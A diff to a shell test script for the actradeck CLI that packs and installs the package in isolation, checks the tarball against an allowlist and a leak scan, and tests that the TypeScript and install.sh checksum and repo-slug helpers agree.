+# Environment-dependent (needs npm + pnpm + an installed workspace). When present (CI + dev)
+# it builds the CLI, packs a REAL tarball, installs it into an isolated prefix/HOME, runs the
+# real `actradeck` bin, AND re-scans the packed tarball against the allowlist + leak patterns
+# for real. When the toolchain is absent it prints an informational SKIP (the config-level
+# npm INVs above still ran, falsifiably).
+if command -v npm >/dev/null 2>&1 && command -v pnpm >/dev/null 2>&1 && command -v node >/dev/null 2>&1 && [ -d "$ROOT/node_modules" ] && [ -f "$CLI_PKG" ]; then
+  E2E="$WORK/npm-e2e"; mkdir -p "$E2E/home" "$E2E/prefix" "$E2E/pack"
+  if pnpm --filter ./packages/cli run build >/dev/null 2>&1; then
+    if ( cd "$ROOT/packages/cli" && npm pack --pack-destination "$E2E/pack" >/dev/null 2>&1 ); then
+      NPM_TGZ="$(find "$E2E/pack" -name '*.tgz' -print -quit)"
+      # REAL packed tarball: allowlist + leak (authoritative, alongside the logic checks above).
+      real_listing="$(tar tzf "$NPM_TGZ" | sed 's#^package/##' | grep -v '^$')" || true
+      if pack_allowlist_ok "$real_listing"; then
+        ok "INV-NPM-PACK-ALLOWLIST: REAL npm pack tarball is within the allowlist (built + packed)"
+      else
+        ng "INV-NPM-PACK-ALLOWLIST: REAL npm pack tarball ships a file outside the allowlist"
+      fi
+      NPX="$E2E/pack/x"; mkdir -p "$NPX"; tar xzf "$NPM_TGZ" -C "$NPX"
+      # SHARED checker (forbidden files + coupling scan when oss-patterns.sh is present) — no
+      # literal coupling pattern in this shipped file.
+      if tarball_no_leak "$NPX" >/dev/null 2>&1; then
+        ok "INV-NPM-PACK-ALLOWLIST: REAL npm pack tarball is leak-clean (forbidden-file + coupling scan)"
+      else
+        ng "INV-NPM-PACK-ALLOWLIST: REAL npm pack tarball tripped the leak scan"
+      fi
+      # isolated global install + run the real bin.
+      if HOME="$E2E/home" npm install -g --prefix "$E2E/prefix" "$NPM_TGZ" >/dev/null 2>&1; then
+        NPM_BIN="$E2E/prefix/bin/actradeck"
+        ver_out="$(HOME="$E2E/home" "$NPM_BIN" version 2>&1)" || true
+        doc_out="$(HOME="$E2E/home" "$NPM_BIN" doctor 2>&1)" || true
+        rootv="$(jq -r '.version' "$ROOT/package.json")"
+        if printf '%s' "$ver_out" | grep -qF "actradeck $rootv"; then
+          ok "INV-NPM-EXEC-E2E: installed bin 'actradeck version' prints the packaged version ($rootv)"
+        else
+          ng "INV-NPM-EXEC-E2E: installed bin did not print 'actradeck $rootv' (got: $(printf '%s' "$ver_out" | head -1))"
+        fi
+        if printf '%s' "$doc_out" | grep -qE '\] (platform|node)'; then
+          ok "INV-NPM-EXEC-E2E: installed bin 'actradeck doctor' runs and reports checks"
+        else
+          ng "INV-NPM-EXEC-E2E: installed bin 'actradeck doctor' produced no diagnostic table"
+        fi
+      else
+        ng "INV-NPM-EXEC-E2E: isolated 'npm install -g' of the packed tarball failed"
+      fi
+    else
+      ng "INV-NPM-EXEC-E2E: npm pack of packages/cli failed"
+    fi
+  else
+    ng "INV-NPM-EXEC-E2E: could not build packages/cli (pnpm --filter ./packages/cli run build failed)"
+  fi
+else
+  echo "SKIP  INV-NPM-EXEC-E2E / REAL pack: npm/pnpm/node or node_modules absent — config-level npm INVs above still ran (falsifiable)."
+fi
+
+# --- INV-NPM-TS-SHELL-PARITY (TDA-2) ----------------------------------------
+# The CLI (TypeScript) and scripts/install.sh (POSIX sh) each implement the SAME verify
+# primitives: expected_digest_for / verify_sha256 (byte-identical digest semantics) and the
+# owner/name reduction (repo_slug / repoSlug). Feed IDENTICAL vectors to both and assert equal
+# outputs, so a change to one that silently diverges from the other is caught. `inst` sources
+# install.sh's pure helpers (ACTRADECK_INSTALL_SOURCE_ONLY=1); `tseval` runs the built CLI dist.
+# PARITY DOMAIN for repo_slug: FULL URLs with a host (install.sh's real input; the shell helper
+# defers shape validation to its caller and does NOT handle bare `owner/name` or scp `host:o/r`,
+# whereas the TS repoSlug validates inline — those inputs are out of the shared domain by design).
+if command -v node >/dev/null 2>&1 && command -v pnpm >/dev/null 2>&1 && [ -d "$ROOT/node_modules" ] && [ -f "$ROOT/packages/cli/package.json" ]; then
+  if pnpm --filter ./packages/cli run build >/dev/null 2>&1; then
+    TSJS="$WORK/ts-eval.mjs"
+    cat > "$TSJS" <<'JS'
+import { pathToFileURL } from "node:url";
+import { readFileSync } from "node:fs";
+const cli = process.argv[2];
+const { repoSlug } = await import(pathToFileURL(cli + "/dist/lib/repo.js").href);
+const { expectedDigestFor, verifySha256 } = await import(pathToFileURL(cli + "/dist/lib/checksum.js").href);
+const op = process.argv[3], a = process.argv.slice(4);
+if (op === "repo_slug") process.stdout.write(repoSlug(a[0]) ?? "");
+else if (op === "expected_digest_for") process.stdout.write(expectedDigestFor(readFileSync(a[0], "utf8"), a[1]) ?? "");
+else if (op === "verify_sha256") process.stdout.write(verifySha256(readFileSync(a[0]), a[1] || null) ? "true" : "false");
+JS
+    tseval() { node "$TSJS" "$ROOT/packages/cli" "$@"; }
+    shv()   { inst verify_sha256 "$1" "$2" >/dev/null 2>&1 && echo true || echo false; }
+
+    P_OK=1; P_N=0
+    parity() { # $1=label $2=shell_out $3=ts_out
+      P_N=$((P_N + 1))
+      [ "$2" = "$3" ] || { ng "INV-NPM-TS-SHELL-PARITY: MISMATCH on $1 (shell='$2' ts='$3')"; P_OK=0; }
+    }
+
+    # digest vectors -----------------------------------------------------------
+    PARF="$WORK/parity"; mkdir -p "$PARF"
+    CONTENT="$PARF/actradeck-0.4.0.tar.gz"; printf 'parity-content\n' > "$CONTENT"
+    DGT="$(sha256sum "$CONTENT" | cut -d' ' -f1)"
+    CSF="$PARF/checksums.txt"; printf '%s  actradeck-0.4.0.tar.gz\n%s  other.bin\n' "$DGT" "0000000000000000000000000000000000000000000000000000000000000000" > "$CSF"
+    parity "expected_digest_for(present)" "$(inst expected_digest_for "$CSF" actradeck-0.4.0.tar.gz)" "$(tseval expected_digest_for "$CSF" actradeck-0.4.0.tar.gz)"
+    parity "expected_digest_for(absent)"  "$(inst expected_digest_for "$CSF" nope.tar.gz)"           "$(tseval expected_digest_for "$CSF" nope.tar.gz)"
+    parity "verify_sha256(match)"    "$(shv "$CONTENT" "$DGT")"                    "$(tseval verify_sha256 "$CONTENT" "$DGT")"
+    parity "verify_sha256(mismatch)" "$(shv "$CONTENT" 0000000000000000000000000000000000000000000000000000000000000000)" "$(tseval verify_sha256 "$CONTENT" 0000000000000000000000000000000000000000000000000000000000000000)"
+    parity "verify_sha256(empty)"    "$(shv "$CONTENT" "")"                        "$(tseval verify_sha256 "$CONTENT" "")"
+    # QA-R2-1a — UPPERCASE-hex checksums: both sides must NORMALIZE case (a hex digest is
+    # case-insensitive). expected_digest_for must return the SAME (lowercased) digest; verify_sha256
+    # must ACCEPT an uppercase expected. (pre-fix: shell was case-sensitive -> divergence.)
+    UP="$(printf '%s' "$DGT" | tr 'a-f' 'A-F')"
+    CSU="$PARF/checksums.upper.txt"; printf '%s  actradeck-0.4.0.tar.gz\n' "$UP" > "$CSU"
+    parity "expected_digest_for(upper-hex)" "$(inst expected_digest_for "$CSU" actradeck-0.4.0.tar.gz)" "$(tseval expected_digest_for "$CSU" actradeck-0.4.0.tar.gz)"
+    parity "verify_sha256(upper-expected)"  "$(shv "$CONTENT" "$UP")"                                   "$(tseval verify_sha256 "$CONTENT" "$UP")"
+    # QA-R2-1b — CRLF checksums: expected_digest_for must find the digest despite \r\n line endings.
+    # (pre-fix: shell awk saw `name\r` != `name` -> not found -> divergence.)
+    CSC="$PARF/checksums.crlf.txt"; printf '%s  actradeck-0.4.0.tar.gz\r\n%s  other.bin\r\n' "$DGT" "0000000000000000000000000000000000000000000000000000000000000000" > "$CSC"
+    parity "expected_digest_for(crlf)" "$(inst expected_digest_for "$CSC" actradeck-0.4.0.tar.gz)" "$(tseval expected_digest_for "$CSC" actradeck-0.4.0.tar.gz)"
+    # repo_slug vectors (full-URL domain) --------------------------------------
+    for u in "https://github.com/acme/tool" "https://github.com/acme/tool.git" "https://x:y@github.com/acme/tool"; do
+      parity "repo_slug($u)" "$(inst repo_slug "$u")" "$(tseval repo_slug "$u")"
+    done
+    [ "$P_OK" = 1 ] && ok "INV-NPM-TS-SHELL-PARITY: TS and install.sh agree on all $P_N digest/repo vectors"
+
+    # injected-divergence RED: feed the two sides DIFFERENT asset names -> outputs differ ->
+    # the parity comparison MUST detect the mismatch (proves it isn't vacuous).
+    d_shell="$(inst expected_digest_for "$CSF" actradeck-0.4.0.tar.gz)"
+    d_ts="$(tseval expected_digest_for "$CSF" other-name.tar.gz)"
+    if [ "$d_shell" != "$d_ts" ]; then
+      ok "INV-NPM-TS-SHELL-PARITY: comparison DETECTS an injected TS/shell divergence (falsifiable)"
+    else
+      ng "INV-NPM-TS-SHELL-PARITY: DEAD — injected divergence not detected (vacuous parity)"
+    fi
+  else
+    ng "INV-NPM-TS-SHELL-PARITY: could not build packages/cli for the differential test"
+  fi
+else
+  echo "SKIP  INV-NPM-TS-SHELL-PARITY: node/pnpm/node_modules absent (differential test needs the built dist)."
 fi
 
 # ============================================================================
